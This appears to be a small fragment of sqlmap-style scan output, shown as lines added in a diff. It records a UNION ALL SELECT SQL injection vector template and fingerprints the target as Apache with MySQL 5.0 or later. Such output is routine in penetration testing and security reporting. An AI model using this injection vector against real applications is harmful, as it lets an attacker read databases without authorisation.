+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
